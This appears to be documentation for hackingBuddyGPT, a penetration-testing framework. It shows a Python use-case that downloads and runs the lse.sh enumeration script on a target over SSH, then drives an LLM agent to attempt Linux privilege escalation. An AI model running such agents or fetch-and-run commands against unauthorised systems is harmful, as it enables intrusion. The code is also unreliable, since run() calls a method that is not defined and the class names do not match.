---
title: Calling Agents from Use-Cases
nextjs:
  metadata:
    title: Calling Agents from Use-Cases
    description: "HackingBuddyGPT: Create a custom use-case which calls other (existing) agents"
---

So you have an idea for a new use-case and want to call other existing agents from within that use-case. This is easily possible using hackingBuddyGPT.

One example of this would be `ExPrivEscLinuxLSEUseCase`. This example use-case initially calls the `LSE.sh` binary to enumerate the target system, takes its output, and uses an LLM to extract up to three hints based upon the enumeration. It subsequently calls the standard `LinuxPrivesc` Agent with the hint to perform the actual privilege escalation attack.

To achieve this, our use-case is sub-classing `UseCase`, thus we need to implement `get_name` and `run` ourself. The `run` method in turn is used to call `call_lse_against_host` to perform the enumeration using `lse.sh`. It also uses an LLM to summarize the output into potential hints that will be later passed on to the agent.

In the `run` method itself, we iterate over the hints and call the `run_using_agent` method to actually instantiate a new agent that will be used to hack the target system. We calculate a new `max_turn` value so that the overall turn count will stay constant.

```python
@use_case("Linux Privilege Escalation using lse.sh for initial guidance")
class LinuxPrivescWithLSEUseCase(UseCase):
    conn: SSHConnection = None
    max_turns: int = 20
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    llm: OpenAIConnection = None

    _got_root: bool = False

    def init(self):
        super().init()

    # simple helper that uses lse.sh to get hints from the system
    def call_lse_against_host(self):
        self._log.console.print("[green]performing initial enumeration with lse.sh")

        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)

        self.console.print("[yellow]got the output: " + result)
        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
        self.console.print("[yellow]got the cmd: " + cmd.result)

        return [x for x in cmd.result.splitlines() if x.strip()] 

    def get_name(self) -> str:
        return self.__class__.__name__
    
    def run(self):
        # get the hints through running LSE on the target system
        hints = self.call_lse_against_host()
        turns_per_hint = int(self.max_turns / len(hints))

        # now try to escalate privileges using the hints
        for hint in hints:
            result = self.run_using_usecases(hint, turns_per_hint)
            if result is True:
                self.console.print("[green]Got root!")
                return True

    def run_using_agent(self, hint, turns_per_hint):
        # init agent
        agent = LinuxPrivesc(
            conn = self.conn,
            llm = self.llm,
            hint = hint,
            enable_explanation = self.enable_explanation,
            enable_update_state = self.enable_update_state,
            disable_history = self.disable_history
        )
        agent._log = self._log
        agent.init()

        # perform the privilege escalation
        agent.before_run()
        turn = 1
        got_root = False
        while turn <= turns_per_hint and not got_root:
            self._log.console.log(f"[yellow]Starting turn {turn} of {turns_per_hint}")

            if agent.perform_round(turn) is True:
                got_root = True
            turn += 1
        
        # cleanup and finish
        agent.after_run()
        return got_root
```

The `run_using_agent` method is simple (and a bit tedious). After we instantiate the `LinuxPrivesc` agent (please remember to set `_log` and call `.init()` and `.before_run()`), we have to manually implement the loop that will call the agent's `perform_round` method.
